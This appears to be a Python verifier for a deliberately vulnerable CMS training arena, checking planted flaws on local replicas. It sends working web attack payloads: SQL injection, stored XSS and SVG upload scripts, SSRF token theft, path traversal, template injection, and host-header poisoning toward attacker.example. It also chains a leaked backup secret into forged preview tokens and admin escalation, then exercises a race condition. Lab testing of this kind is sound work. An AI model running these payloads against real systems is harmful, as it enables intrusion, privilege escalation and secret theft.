#!/usr/bin/env python3
"""Black-box acceptance verifier for the 28 CMS/framework family replicas."""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen


ROOT = Path(__file__).resolve().parents[1]
PROFILES = json.loads((ROOT / "apps" / "cms-suite" / "profiles.json").read_text(encoding="utf-8"))


@dataclass(frozen=True)
class Reply:
    status: int
    headers: dict[str, str]
    body: bytes

    def json(self) -> dict:
        return json.loads(self.body.decode("utf-8"))


def http(method: str, url: str, *, headers: dict[str, str] | None = None, body: bytes | None = None) -> Reply:
    request_headers = {"User-Agent": "vuln-arena-cms-verifier/1", **(headers or {})}
    if method in {"POST", "PATCH", "PUT"} and body is None:
        body = b""
    request = Request(url, data=body, headers=request_headers, method=method)
    try:
        with urlopen(request, timeout=6) as response:
            return Reply(response.status, {key.lower(): value for key, value in response.headers.items()}, response.read())
    except HTTPError as exc:
        return Reply(exc.code, {key.lower(): value for key, value in exc.headers.items()}, exc.read())


def digest(seed: str, profile: str, label: str, length: int) -> str:
    return hmac.new(seed.encode(), f"{profile}:{label}".encode(), hashlib.sha256).hexdigest()[:length]


def expected_proof(seed: str, profile: str, number: int) -> str:
    suffix = digest(seed, profile, f"CMS-{number:02d}", 12)
    return f"ARENA{{{profile}-cms-{number:02d}-{suffix}}}"


def require(condition: bool, message: str) -> None:
    if not condition:
        raise AssertionError(message)


def record(checks: list[dict], check_id: str, category: str, condition: bool, message: str) -> None:
    require(condition, f"{check_id}: {message}")
    checks.append({"id": check_id, "category": category, "status": "pass"})


def multipart(filename: str, media_type: str, payload: bytes, boundary: str) -> tuple[dict[str, str], bytes]:
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: {media_type}\r\n\r\n"
    ).encode() + payload + f"\r\n--{boundary}--\r\n".encode()
    return {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body


def verify_profile(host: str, port: int, profile: dict, seed: str) -> dict:
    profile_id = profile["id"]
    base = f"http://{host}:{port}"
    proofs = {number: expected_proof(seed, profile_id, number) for number in range(1, 14)}
    checks: list[dict] = []

    reset_header = {"X-Arena-Reset": digest(seed, profile_id, "reset-control", 24)}
    protected_reset = http("POST", base + "/api/lab/reset")
    record(checks, "CTRL-RESET-AUTH", "negative_control", protected_reset.status == 403, "reset worked without its capability")
    reset = http("POST", base + "/api/lab/reset", headers=reset_header)
    record(checks, "RESET-INITIAL", "reset_replay", reset.status == 200 and reset.json().get("reset") is True, "reset capability failed")

    # One negative/control check per objective. These controls establish that the
    # positive result is caused by the intended boundary failure, not normal behavior.
    search_control = http("GET", base + "/api/search?" + urlencode({"q": "week"})).json()
    record(checks, "CTRL-CMS-01", "negative_control", search_control.get("proof") is None and not any(row.get("id") == 99 for row in search_control.get("rows", [])), "ordinary search returned the sealed record")

    public_control = http("GET", base + "/api/content/1").json()
    record(checks, "CTRL-CMS-02", "negative_control", public_control.get("status") == "published" and "proof" not in public_control, "published control record was not clean")

    benign_comment = http(
        "POST",
        base + "/api/comments",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"author": "control", "body": "ordinary review note"}).encode(),
    ).json()
    record(checks, "CTRL-CMS-03", "negative_control", benign_comment.get("stored") is True and benign_comment.get("proof") is None, "benign comment produced XSS proof")

    ssrf_control = http("GET", base + "/api/integrations/preview?" + urlencode({"url": "http://cms-metadata:8081/status"}))
    record(checks, "CTRL-CMS-04", "negative_control", ssrf_control.status == 200 and "x-arena-proof" not in ssrf_control.headers and b"integration_token" not in ssrf_control.body, "ordinary integration status leaked a token or proof")

    media_control = http("GET", base + "/api/media?" + urlencode({"file": "welcome.txt"}))
    record(checks, "CTRL-CMS-05", "negative_control", media_control.status == 200 and "x-arena-proof" not in media_control.headers and profile["brand"].encode() in media_control.body, "public media control was not clean")

    ssti_control = http("GET", base + "/api/theme/preview?" + urlencode({"name": profile["brand"]}))
    record(checks, "CTRL-CMS-06", "negative_control", ssti_control.status == 200 and "x-arena-proof" not in ssti_control.headers and profile["brand"].encode() in ssti_control.body, "plain theme name produced template proof")

    denied_assignment = http(
        "PATCH",
        base + "/api/users/2",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"role": "admin", "tenant": profile_id}).encode(),
    )
    record(checks, "CTRL-CMS-07", "negative_control", denied_assignment.status == 403, "protected fields changed without integration capability")

    env_control = http("GET", base + "/.env")
    record(checks, "CTRL-CMS-08", "negative_control", env_control.status == 404 and b"PREVIEW_SECRET" not in env_control.body, "non-backup environment path disclosed configuration")

    bad_preview = http("GET", base + "/api/preview?" + urlencode({"content": "2", "token": "invalid"}))
    private_presign = http("GET", base + "/api/presign?" + urlencode({"content": "2"}))
    record(checks, "CTRL-CMS-09A", "negative_control", bad_preview.status == 403, "invalid preview signature was accepted")
    record(checks, "CTRL-CMS-09B", "negative_control", private_presign.status == 403, "public signer signed private content")

    control_headers, control_upload = multipart("note.txt", "text/plain", b"ordinary text", "----ArenaControlBoundary")
    rejected_upload = http("POST", base + "/api/upload", headers=control_headers, body=control_upload)
    record(checks, "CTRL-CMS-10", "negative_control", rejected_upload.status == 415, "disallowed text upload was accepted")

    host_control = http("GET", base + "/api/reset-link").json()
    record(checks, "CTRL-CMS-11", "negative_control", "proof" not in host_control and "attacker.example" not in host_control.get("link", ""), "ordinary reset link was poisoned")

    normal_cache_key = f"control-{profile_id}-{time.time_ns()}"
    normal_first = http("GET", base + "/api/navigation?" + urlencode({"case": normal_cache_key}))
    normal_second = http("GET", base + "/api/navigation?" + urlencode({"case": normal_cache_key}))
    normal_payload = normal_second.json()
    record(checks, "CTRL-CMS-12", "negative_control", normal_first.headers.get("x-cms-cache") == "MISS" and normal_second.headers.get("x-cms-cache") == "HIT" and normal_payload.get("language") == "en" and normal_payload.get("notice") == "Publishing normally" and "proof" not in normal_payload, "normal cache representation was altered")

    http("POST", base + "/api/lab/reset", headers=reset_header)
    sequential_first = http("POST", base + "/api/publish-credit")
    sequential_second = http("POST", base + "/api/publish-credit")
    record(checks, "CTRL-CMS-13", "negative_control", sequential_first.status == 200 and sequential_second.status == 409, "sequential requests violated the single-credit invariant")

    # Shortcut resistance: proofs and secrets must not be collectible from normal
    # public assets, and a token derived for another profile must not authorize here.
    root_page = http("GET", base + "/")
    static_js = http("GET", base + "/static/app.js")
    proof_bytes = [value.encode() for value in proofs.values()]
    record(checks, "SHORTCUT-PUBLIC-PAGE", "shortcut_resistance", not any(value in root_page.body for value in proof_bytes) and b"PREVIEW_SECRET=" not in root_page.body, "home page exposed proof or preview secret")
    record(checks, "SHORTCUT-STATIC-ASSET", "shortcut_resistance", not any(value in static_js.body for value in proof_bytes) and b"local-training-seed" not in static_js.body, "static asset exposed proof or seed")
    other_profile = next(item for item in PROFILES if item["id"] != profile_id)
    other_secret = digest(seed, other_profile["id"], "preview-secret", 32)
    cross_profile_token = hmac.new(other_secret.encode(), b"2", hashlib.sha256).hexdigest()
    cross_profile_preview = http("GET", base + "/api/preview?" + urlencode({"content": "2", "token": cross_profile_token}))
    record(checks, "SHORTCUT-CROSS-PROFILE", "shortcut_resistance", cross_profile_preview.status == 403, "another profile's preview token replayed successfully")

    # Restore a known state before positive verification.
    positive_reset = http("POST", base + "/api/lab/reset", headers=reset_header)
    record(checks, "RESET-PRE-POSITIVE", "reset_replay", positive_reset.status == 200, "pre-positive reset failed")

    sqli = http("GET", base + "/api/search?" + urlencode({"q": "' OR 1=1--"})).json()
    record(checks, "CMS-01", "positive", sqli.get("proof") == proofs[1] and any(row.get("id") == 99 for row in sqli.get("rows", [])), "SQLi proof missing")

    private = http("GET", base + "/api/content/2").json()
    record(checks, "CMS-02", "positive", private.get("status") == "private" and private.get("proof") == proofs[2], "IDOR proof missing")

    xss_body = json.dumps({"author": "verifier", "body": '<img src=x onerror="window.__arena=1">'}).encode()
    stored = http("POST", base + "/api/comments", headers={"Content-Type": "application/json"}, body=xss_body).json()
    moderation = http("GET", base + "/moderation")
    record(checks, "CMS-03", "positive", stored.get("proof") == proofs[3] and proofs[3].encode() in moderation.body and b"onerror=" in moderation.body, "stored-XSS browser evidence missing")

    metadata_url = f"http://cms-metadata:8081/token?site={profile_id}"
    ssrf = http("GET", base + "/api/integrations/preview?" + urlencode({"url": metadata_url}))
    ssrf_payload = ssrf.json()
    record(checks, "CMS-04", "positive", ssrf.headers.get("x-arena-proof") == proofs[4] and ssrf_payload.get("proof") == proofs[4], "SSRF proof missing")

    traversal = http("GET", base + "/api/media?" + urlencode({"file": "../private/config.ini"}))
    record(checks, "CMS-05", "positive", traversal.headers.get("x-arena-proof") == proofs[5] and proofs[5].encode() in traversal.body, "path-traversal proof missing")

    ssti = http("GET", base + "/api/theme/preview?" + urlencode({"name": "{{7*7}}"}))
    record(checks, "CMS-06", "positive", ssti.headers.get("x-arena-proof") == proofs[6] and b">49<" in ssti.body, "SSTI proof missing")

    integration_token = ssrf_payload.get("integration_token", "")
    elevated = http(
        "PATCH",
        base + "/api/users/2",
        headers={"Content-Type": "application/json", "X-CMS-Integration": integration_token},
        body=json.dumps({"role": "admin", "tenant": profile_id}).encode(),
    ).json()
    record(checks, "CMS-07", "positive", elevated.get("role") == "admin" and elevated.get("proof") == proofs[7], "mass-assignment proof missing")

    backup = http("GET", base + "/.env.bak")
    record(checks, "CMS-08", "positive", backup.status == 200 and proofs[8].encode() in backup.body and b"PREVIEW_SECRET=" in backup.body, "backup disclosure proof missing")
    preview_secret = next(line.split("=", 1)[1] for line in backup.body.decode().splitlines() if line.startswith("PREVIEW_SECRET="))
    preview_token = hmac.new(preview_secret.encode(), b"2", hashlib.sha256).hexdigest()
    preview = http("GET", base + "/api/preview?" + urlencode({"content": "2", "token": preview_token})).json()
    record(checks, "CMS-09", "positive", preview.get("status") == "private" and preview.get("proof") == proofs[9], "forged-preview proof missing")

    boundary = "----VulnArenaVerifierBoundary"
    upload_payload = b'<svg onload="window.__arena=2"></svg>'
    upload_headers, upload_body = multipart("release.jpg", "text/html", upload_payload, boundary)
    uploaded = http("POST", base + "/api/upload", headers=upload_headers, body=upload_body).json()
    served = http("GET", base + uploaded.get("url", "/uploads/missing"))
    record(checks, "CMS-10", "positive", uploaded.get("proof") == proofs[10] and "text/html" in served.headers.get("content-type", "") and b"onload=" in served.body, "upload-confusion proof missing")

    reset_link = http("GET", base + "/api/reset-link", headers={"X-Forwarded-Host": "attacker.example"}).json()
    record(checks, "CMS-11", "positive", reset_link.get("proof") == proofs[11] and "attacker.example" in reset_link.get("link", ""), "host-poisoning proof missing")

    cache_key = f"verify-{profile_id}-{time.time_ns()}"
    poisoned = http(
        "GET",
        base + "/api/navigation?" + urlencode({"case": cache_key}),
        headers={"X-Site-Language": "zz", "X-Site-Notice": "untrusted navigation"},
    ).json()
    cached = http("GET", base + "/api/navigation?" + urlencode({"case": cache_key}))
    cached_payload = cached.json()
    record(checks, "CMS-12", "positive", poisoned.get("proof") == proofs[12] and cached.headers.get("x-cms-cache") == "HIT" and cached_payload.get("notice") == "untrusted navigation", "cache-poisoning proof missing")

    http("POST", base + "/api/lab/reset", headers=reset_header)
    with ThreadPoolExecutor(max_workers=2) as pool:
        race_replies = list(pool.map(lambda _: http("POST", base + "/api/publish-credit"), range(2)))
    race_payloads = [reply.json() for reply in race_replies]
    record(checks, "CMS-13", "positive", all(reply.status == 200 for reply in race_replies) and any(item.get("proof") == proofs[13] for item in race_payloads), "publish-credit race proof missing")

    final_reset = http("POST", base + "/api/lab/reset", headers=reset_header)
    record(checks, "RESET-FINAL", "reset_replay", final_reset.status == 200, "final reset failed")

    restored_user = http("GET", base + "/api/users/2").json()
    restored_moderation = http("GET", base + "/moderation")
    removed_upload = http("GET", base + "/uploads/release.jpg")
    replay_cache_key = f"replay-{profile_id}-{time.time_ns()}"
    restored_cache = http("GET", base + "/api/navigation?" + urlencode({"case": replay_cache_key}))
    restored_credit = http("POST", base + "/api/publish-credit")
    record(checks, "REPLAY-USER", "reset_replay", restored_user.get("role") == "viewer" and restored_user.get("tenant") == "partner-space", "reset did not restore user authorization state")
    record(checks, "REPLAY-COMMENTS", "reset_replay", b"window.__arena=1" not in restored_moderation.body and proofs[3].encode() not in restored_moderation.body, "reset retained stored-XSS state")
    record(checks, "REPLAY-UPLOAD", "reset_replay", removed_upload.status == 404, "reset retained uploaded active content")
    record(checks, "REPLAY-CACHE", "reset_replay", restored_cache.headers.get("x-cms-cache") == "MISS" and restored_cache.json().get("notice") == "Publishing normally", "reset retained poisoned cache state")
    record(checks, "REPLAY-RACE", "reset_replay", restored_credit.status == 200 and restored_credit.json().get("starts") == 1, "reset did not restore publish-credit state")
    cleanup = http("POST", base + "/api/lab/reset", headers=reset_header)
    record(checks, "RESET-CLEANUP", "reset_replay", cleanup.status == 200, "cleanup reset failed")

    counts = {}
    for category in {item["category"] for item in checks}:
        counts[category] = sum(item["category"] == category for item in checks)
    return {"profile": profile_id, "port": port, "status": "pass", "counts": counts, "checks": checks}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--seed", default=os.getenv("ARENA_RUN_SEED", "local-training-seed"))
    parser.add_argument("--only", help="verify one profile id")
    parser.add_argument("--json-out", type=Path, help="write a machine-readable acceptance report")
    args = parser.parse_args()

    selected = [(18017 + index, profile) for index, profile in enumerate(PROFILES) if not args.only or profile["id"] == args.only]
    if not selected:
        print(f"Unknown profile: {args.only}", file=sys.stderr)
        return 2

    failures: list[str] = []
    results: list[dict] = []
    for port, profile in selected:
        try:
            result = verify_profile(args.host, port, profile, args.seed)
            results.append(result)
            counts = result["counts"]
            print(
                f"PASS {port}  {profile['id']:<14} "
                f"{counts.get('positive', 0)} positive + "
                f"{counts.get('negative_control', 0)} controls + "
                f"{counts.get('shortcut_resistance', 0)} shortcuts + "
                f"{counts.get('reset_replay', 0)} replay"
            )
        except (AssertionError, OSError, URLError, ValueError, KeyError, json.JSONDecodeError) as exc:
            failures.append(f"{profile['id']} ({port}): {exc}")
            results.append({"profile": profile["id"], "port": port, "status": "fail", "error": str(exc)})
            print(f"FAIL {port}  {profile['id']:<14} {exc}")

    report = {
        "schema_version": "1.0",
        "suite": "cms-platform-acceptance",
        "targets": len(selected),
        "status": "fail" if failures else "pass",
        "summary": {
            "positive_checks": sum(item.get("counts", {}).get("positive", 0) for item in results),
            "negative_controls": sum(item.get("counts", {}).get("negative_control", 0) for item in results),
            "shortcut_checks": sum(item.get("counts", {}).get("shortcut_resistance", 0) for item in results),
            "reset_replay_checks": sum(item.get("counts", {}).get("reset_replay", 0) for item in results),
            "failed_targets": len(failures),
        },
        "results": results,
    }
    if args.json_out:
        args.json_out.parent.mkdir(parents=True, exist_ok=True)
        args.json_out.write_text(json.dumps(report, indent=2) + "\n", encoding="utf-8")

    if failures:
        print("\nCMS suite failures:", file=sys.stderr)
        for failure in failures:
            print(f"- {failure}", file=sys.stderr)
        return 1

    summary = report["summary"]
    print(
        f"\nVerified {len(selected)} targets: {summary['positive_checks']} positive objectives, "
        f"{summary['negative_controls']} negative controls, {summary['shortcut_checks']} shortcut checks, "
        f"and {summary['reset_replay_checks']} reset/replay checks."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
